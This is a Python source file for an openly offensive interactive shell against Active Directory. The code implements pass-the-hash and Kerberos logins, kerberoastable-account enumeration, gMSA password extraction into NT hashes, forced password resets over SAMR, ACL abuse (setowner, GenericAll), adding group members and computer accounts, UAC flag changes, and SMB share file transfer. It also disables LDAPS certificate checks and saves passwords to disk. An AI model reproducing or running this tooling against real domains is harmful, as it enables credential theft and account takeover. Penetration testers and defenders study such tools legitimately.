import time
import ssl
from ldap3 import Server, ALL, Connection, NTLM, SUBTREE, Tls, MODIFY_ADD, MODIFY_REPLACE, SASL, KERBEROS
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID
from rich import print # for colors
import readline
import rlcompleter
import os
import atexit
import heapq
import shlex
histfile = os.path.expanduser(".ldap_shell_history")

if os.path.exists(histfile):
    readline.read_history_file(histfile)

atexit.register(readline.write_history_file, histfile)
from src.structs import Session, Queue, DecisionNode, TreeNode, HistoryNode, SinglyLinkedList, SessionManager, BSTNode, UserCacheBST
from src.utils import UAC_FLAGS, COMMANDS, shell_completer, show_menu, infer_netbios, domain_to_dn, check_connection, sid_to_string, save_password, resolve_sid, resolve_member_name
from src.queries import batch_lookup, build_category_tree, print_categories, list_groups_bfs, list_users, list_computers, kerberoastable, get_sid, get_maq
from src.add import add_member, add_computer, modify_uac, set_password
from src.acls import cmd_setowner, cmd_genericall
from src.auth import samr_set_password
from src.discover import get_domain_info
sessions = Session()
current_session = None
history = Session()
MAX_SESSIONS = 10
decision_tree = DecisionNode("Am I connected?")
decision_tree.left = DecisionNode("Not Connected. Run 'connect'")
decision_tree.right = DecisionNode("Connected. Continue")
user_cache = UserCacheBST()


def connect(connection):
    #session = Session()
    global current_session

    while True:
        if current_session:
            prompt = f"ldap({current_session['username']}@{current_session['ip']})> "
        else:
            prompt = "shell> "

        try:
            command = shlex.split(input(prompt).strip())
        except ValueError:
            command = input(prompt).strip().split()
        if not command:
            continue
        elif command[0] == "help":
            show_menu()
        elif command[0] == "connect":
            if len(command) < 5:
                print("connect <username> <password> <domain> <dc_ip>")
                continue
            username = command[1]
            password = command[2]
            domain = command[3]
            dc_ip = command[4]

            netbios = infer_netbios(domain)
            base_dn = domain_to_dn(domain)
            try:
                server = Server(dc_ip, get_info=ALL)
                conn = Connection(server, user=f"{netbios}\\{username}", password=password, authentication=NTLM, auto_bind=True)
                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "ldaps": False}
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {domain}. Session ID: {sessions.size()-1}[/bold green]")
                save_password(password)
            except Exception as e:
                print(f"[-] Connection Failed: {e}")
        elif command[0] == "connectk":
            if len(command) < 5:
                print("connectk <username> <password> <domain> <dc_ip>")
                continue
            username = command[1]
            password = command[2]
            domain = command[3]
            dc_ip = command[4]

            netbios = infer_netbios(domain)
            base_dn = domain_to_dn(domain)

            try:
                from impacket.krb5.kerberosv5 import getKerberosTGT
                from impacket.krb5.types import Principal
                from impacket.krb5 import constants
                from impacket.krb5.ccache import CCache

                realm = domain.upper()
                print(f"[*] Getting TGT for {username}@{realm} via impacket...")

                # Build principal (works with machine accounts like MS01$)
                user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                tgt, cipher, old_session_key, session_key = getKerberosTGT(user_principal, password, realm, None, None, None, dc_ip)

                # Save to ccache file (same as getTGT.py)
                ccache = CCache()
                ccache.fromTGT(tgt, old_session_key, session_key)
                ccache_file = f"{username}.ccache"
                ccache.saveFile(ccache_file)
                os.environ["KRB5CCNAME"] = ccache_file
                print(f"[+] TGT saved to {ccache_file}")

                # Kerberos needs DC hostname, not IP (for SPN matching)
                # First get the DC hostname
                tmp_server = Server(dc_ip, get_info=ALL)
                tmp_conn = Connection(tmp_server, auto_bind=True)
                dc_hostname = tmp_server.info.other.get('dnsHostName', [None])[0]
                tmp_conn.unbind()

                if not dc_hostname:
                    dc_hostname = dc_ip
                    print(f"[!] Could not resolve DC hostname, using IP (may fail)")

                print(f"[*] Connecting to {dc_hostname} via Kerberos...")
                server = Server(dc_hostname, get_info=ALL)
                conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "ldaps":False}
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {domain} via Kerberos. Session ID: {sessions.size()-1}[/bold green]")
                save_password(password)
            except Exception as e:
                print(f"[-] Connection Failed: {e}")
        elif command[0] == "connect_hash":
            if len(command) < 5:
                print("connect_hash <username> <nthash> <domain> <dc_ip>")
                continue
            username = command[1]
            nthash = command[2]
            domain = command[3]
            dc_ip = command[4]
            netbios = infer_netbios(domain)
            base_dn = domain_to_dn(domain)

            if ":" not in nthash:
                password = f"aad3b435b51404eeaad3b435b51404ee:{nthash}"
            else:
                password = nthash

            try:
                server = Server(dc_ip, get_info=ALL)
                conn = Connection(server, user=f"{netbios}\\{username}", password=password, authentication=NTLM, auto_bind=True)
                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "nthash": nthash, "ldaps": False}
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {domain} using PTH. Session ID: {sessions.size()-1}[/bold green]")
            except Exception as e:
                print(f"[-] Connection Failed: {e}")

        elif command[0] == "connectssl":
            if len(command) < 5:
                print("connectssl <username> <password> <domain> <dc_ip>")
                continue
            username = command[1]
            password = command[2]
            domain = command[3]
            dc_ip = command[4]
            netbios = infer_netbios(domain)
            base_dn = domain_to_dn(domain)
            try:
                tls = Tls(validate=ssl.CERT_NONE)
                server = Server(dc_ip, port=636, use_ssl=True, get_info=ALL, tls=tls)
                conn = Connection(server, user=f"{netbios}\\{username}", password=password, authentication=NTLM, auto_bind=True)
                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "ldaps": True}
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {domain}. Session ID: {sessions.size()-1}[/bold green]")
                save_password(password)
            except Exception as e:
                print(f"[-] Connection Failed: {e}")

        elif command[0] == "disconnect":
            try:
                dropped = sessions.pop()
                if current_session == dropped:
                    current_session = None
                print(f"Dropped: {dropped.get('username')}@{dropped.get('ip')}")
            except IndexError as e:
                print(e)
        elif command[0] == "status":
            print(sessions)
        elif command[0] == "query":
            check_connection(decision_tree, current_session is not None)

            if current_session is None:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue

            if len(command) < 2:
                print("query <username>")
                continue

            username = command[1]
            try:
                conn = current_session["conn"]
                base_dn = current_session["base_dn"]
                conn.search(base_dn, f"(sAMAccountName={username})", attributes=["cn", "memberOf", "userAccountControl", "userPrincipalName", "objectSid"])
                if conn.entries:
                    entry = conn.entries[0]
                    print(entry)
                    if "userAccountControl" in entry and entry.userAccountControl.value is not None:
                        uac_val = entry.userAccountControl.value
                        flags = [name for name, val in UAC_FLAGS.items() if uac_val & val]
                        print(f"\n[bold cyan]UserAccountControl Flags:[/bold cyan] {', '.join(flags)} ({uac_val})")
                    history.push(username)
                else:
                    print("User not found...")
            except Exception as e:
                print(f"Ldap error: {e}")
        elif command[0] == "history":
            try:
                last = history.pop()
                print(f"Last queried user: {last}")
            except IndexError as e:
                print(e)
        elif command[0] == "show_all_history":
            history.show_all()

        elif command[0] == "batch_lookup":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            batch_lookup(current_session["conn"], current_session["base_dn"])
        elif command[0] == "use":
            if len(command) < 2:
                print("use <session_id>")
                continue
            try:
                sessionid = int(command[1])
                current_session = sessions.items[sessionid]
                print(f"Using session {sessionid} ({current_session['username']} @ {current_session['ip']})")
            except:
                print("Invalid ID")
        elif command[0] == "sessions":
            if sessions.is_empty():
                print("No active sessions :(")
                continue
            for i, s in enumerate(sessions.items):
                elapsed = int(time.time() - s['connected_at'])
                print(f"[{i}] {s['username']} @ {s['ip']} ({elapsed}s)")
        elif command[0] == "categories":
            if not current_session:
                print("No active session!")
                continue
            root = build_category_tree(current_session["conn"], current_session["base_dn"])
            print_categories(root)
        elif command[0] == "groups":
            if not current_session:
                print("No Active Session!")
                continue
            list_groups_bfs(current_session["conn"], current_session["base_dn"])
        elif command[0] == "users":
            if not current_session:
                print("No Active Session!")
                continue
            list_users(current_session["conn"], current_session["base_dn"], user_cache)
        elif command[0] == "offline_search":
            if len(command) < 2:
                print("offline_search  <username>")
                continue
            target = command[1]
            result = user_cache.search(target)
            if result:
                print(f"[bold green][+] Cache Hit ![/bold green]\n{result}")
            else:
                print(f"[bold red][!] User not found in offline cache. Run 'users' first to populate it.[/bold red]")
        elif command[0] == "kerberoasting":
            if not current_session:
                print("No Active Session!")
                continue
            kerberoastable(current_session["conn"], current_session["base_dn"])
        elif command[0] == "computers":
            if not current_session:
                print("No Active Session!")
                continue
            list_computers(current_session["conn"], current_session["base_dn"])
            #else:
                #print("\nActive Sessions\n")

                #for i, s in enumerate(sessions.items):
                    #elapsed = int(time.time() - s['connected_at'])
                    #print(f"[{i}] User: {s['username']}, Domain: {s['ip']}")
                    #print(f"[{i}] {s['username']} @ {s['ip']} ({elapsed}s)")
        elif command[0] == "checkacl":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue

            target_username = current_session.get("username")
            import argparse
            args = argparse.Namespace()
            args.username = target_username
            args.password = current_session.get("password")
            args.domain = current_session.get("domain")
            args.dc_ip = current_session.get("ip")
            args.dc_fqdn = None
            args.hash = current_session.get("nthash")
            args.ldaps = current_session.get("ldaps", False)
            args.kerberos = bool(os.environ.get("KRB5CCNAME"))

            try:
                from aclftw import aclftw
                aclftw.main(args)
            except Exception as e:
                print(f"[-] Error running aclftw: {e}")

        elif command[0] == "setpass":

            if len(command) < 3:
                print("setpass <user> <newpassword>")
                continue

            target_user = command[1]
            newpass = command[2]

            # Use SAMR protocol over SMB (port 445) - no SSL needed
            try:
                samr_set_password(current_session, target_user, newpass)
                print(f"[+] Password changed successfully for {target_user}")
            except Exception as e:
                print(f"[-] Failed to change password: {e}")

        elif command[0] == "savepassword":

            if len(command) < 2:
                print("savepassword <password>")
                continue
            save_password(command[1])

        elif command[0] == "shares":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("Usage:")
                print("  shares <ip>                          - List all shares")
                print("  shares <ip> <share>                  - List files in share")
                print("  shares <ip> <share>\\<subdir>         - Browse subdirectory")
                print("  shares <ip> <share> get <file>       - Download file")
                print("  shares <ip> <share> put <localfile>  - Upload file")
                print("  (Use quotes for share names with spaces: \"Department Shares\")")
                continue
            target_ip = command[1]

            username = current_session.get("username")
            password = current_session.get("password")
            domain = current_session.get("domain")
            nthash = current_session.get("nthash")

            from shares import shares as shares_module

            if len(command) == 2:
                shares_module.main(target_ip, username, password, domain, nthash)
            else:
                action_idx = None
                for i in range(2, len(command)):
                    if command[i].lower() in ("get", "put"):
                        action_idx = i
                        break

                if action_idx is not None:
                    share_parts = command[2:action_idx]
                    action = command[action_idx].lower()
                    filename = command[action_idx + 1] if action_idx + 1 < len(command) else None

                    if not share_parts:
                        print("[-] Missing share name.")
                        continue
                    if not filename:
                        print(f"[-] Missing filename for '{action}'.")
                        continue

                    share_full = " ".join(share_parts)
                    if "\\" in share_full:
                        share = share_full.split("\\")[0]
                        subpath = "\\".join(share_full.split("\\")[1:])
                        filename = subpath + "\\" + filename
                    else:
                        share = share_full

                    if action == "get":
                        shares_module.download_file(target_ip, username, password, domain, share, filename, nthash)
                    elif action == "put":
                        shares_module.upload_file(target_ip, username, password, domain, share, filename, nthash)
                else:
                    share_full = " ".join(command[2:])

                    if "\\" in share_full:
                        parts = share_full.split("\\", 1)
                        share = parts[0].strip()
                        subpath = parts[1].strip().rstrip("\\") + "\\*"
                        shares_module.list_files(target_ip, username, password, domain, share, subpath, nthash)
                    else:
                        share = share_full
                        shares_module.list_files(target_ip, username, password, domain, share, "*", nthash)


            # try:
            #     from shares import shares as shares_module
            #     shares_module.main(
            #         target_ip,
            #         current_session.get("username"),
            #         current_session.get("password"),
            #         current_session.get("domain"),
            #         nthash=current_session.get("nthash")
            #     )
            # except Exception as e:
            #     print(f"[-] Error enumerating shares: {e}")

        elif command[0] == "get_sid":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("get_sid <username>")
                continue
            try:
                get_sid(current_session["conn"], current_session["base_dn"], command[1])
            except Exception as e:
                print(f"[-] Error getting SID: {e}")
        elif command[0] == "addmember":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 3:
                print("addmember <group_name> <username>")
                continue
            try:
                add_member(current_session["conn"], current_session["base_dn"], command[1], command[2])
            except Exception as e:
                print(f"[-] Error while add users: {e}")
        elif command[0] == "getgmsa":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("getgmsa <gmsa_account$>")
                continue
            target_gmsa = command[1]
            if not target_gmsa.endswith('$'):
                target_gmsa += '$'

            try:
                # First try native ldap3 query in case Kerberos or LDAPS is used
                conn = current_session["conn"]
                base_dn = current_session["base_dn"]
                success = False
                
                try:
                    conn.search(base_dn, f"(sAMAccountName={target_gmsa})", attributes=['msDS-ManagedPassword'])
                    if conn.entries and "msDS-ManagedPassword" in conn.entries[0] and conn.entries[0]["msDS-ManagedPassword"].raw_values:
                        password_blob = conn.entries[0]["msDS-ManagedPassword"].raw_values[0]
                        import struct
                        import hashlib
                        version, reserved, length, cur_off, prev_off, query_off, unch_off = struct.unpack('<HHLHHHH', password_blob[:16])
                        offsets = [o for o in [prev_off, query_off, unch_off] if o > cur_off]
                        end_off = min(offsets) if offsets else len(password_blob)
                        pwd_bytes = password_blob[cur_off:end_off]
                        if len(pwd_bytes) >= 2: pwd_bytes = pwd_bytes[:-2]
                        nt_hash = hashlib.new('md4', pwd_bytes).hexdigest()
                        print(f"\n[bold green][+] Successfully extracted GMSA password for {target_gmsa}[/bold green]")
                        print(f"[bold cyan]NT Hash: {nt_hash}[/bold cyan]")
                        success = True
                except Exception as e:
                    pass
                
                if success:
                    continue
                
                # If native ldap3 fails (e.g. UNABLE_TO_PROCEED over port 389 NTLM), use NXC as robust fallback
                import subprocess
                import re
                print(f"[*] Native LDAP3 retrieval failed or blocked. Attempting fallback via NXC NTLM sign/seal...")
                
                cmd = ['nxc', 'ldap', current_session["ip"], '-u', current_session['username']]
                if current_session.get("nthash"):
                    cmd.extend(['-H', current_session["nthash"]])
                else:
                    cmd.extend(['-p', current_session["password"]])
                cmd.append('--gmsa')
                
                out = subprocess.check_output(cmd, text=True, stderr=subprocess.STDOUT)
                
                # Parse NXC output for Account: TARGET_GMSA$ NTLM: hash
                match = re.search(rf"Account:\s*{re.escape(target_gmsa)}\s+NTLM:\s*([a-fA-F0-9]{{32}})", out, re.IGNORECASE)
                if match:
                    print(f"\n[bold green][+] Successfully extracted GMSA password for {target_gmsa}[/bold green]")
                    print(f"[bold cyan]NT Hash: {match.group(1)}[/bold cyan]")
                else:
                    print(f"[-] Could not extract GMSA password via fallback.")
                    print(f"[-] Ensure {target_gmsa} exists and you have 'ReadGmsaPassword' rights.")
                
            except Exception as e:
                print(f"[-] Error retrieving GMSA Password: {e}")

        elif command[0] == "setowner":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("setowner <target_account>")
                continue
            target = command[1]
            session_username = current_session["username"]

            try:
                cmd_setowner(current_session["conn"], current_session["base_dn"], target, session_username)
            except Exception as e:
                print(f"[-] Error setting owner : {e}")
        elif command[0] == "genericall":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("genericall <target_account>")
                continue
            target = command[1]
            session_username = current_session["username"]

            try:
                cmd_genericall(current_session["conn"], current_session["base_dn"], target, session_username)
            except Exception as e:
                print(f"[-] Error adding Genericall: {e}")
        elif command[0] == "adduac":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 3:
                print("adduac <targetname> <FLAG>")
                continue
            try:
                modify_uac(current_session["conn"], current_session["base_dn"], command[1], command[2].upper(), "add")
            except Exception as e:
                print(f"[-] Error modifying UAC: {e}")
        elif command[0] == "rmuac":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 3:
                print("rmuac <targetname> <FLAG>")
                continue
            try:
                modify_uac(current_session["conn"], current_session["base_dn"], command[1], command[2].upper(), "remove")
            except Exception as e:
                print(f"[-] Error modifying UAC: {e}")
        elif command[0] == "addcomputer":
            if not current_session:
                print("No active session!")
                continue
            if len(command) < 3:
                print("addcomputer <computername> <password>")
                continue

            comp_name = command[1]
            comp_pass = command[2]

            try:
                add_computer(current_session["conn"], current_session["base_dn"], comp_name, comp_pass, current_session["domain"], current_session)
            except Exception as e:
                print(f"[-] Error adding computer: {e}")
        elif command[0] == "ldap":
            if len(command) < 2:
                print("ldap <ip>")
                continue
            target_ip = command[1]
            get_domain_info(target_ip)
        elif command[0] == "maq":
            if not current_session:
                print("No active session!")
                continue

            get_maq(current_session["conn"], current_session["base_dn"])

        elif command[0] == "exit":
            break
        else:
            print("Unknown command. Type 'help' for available commands.")
if __name__ == "__main__":
    connect(None)
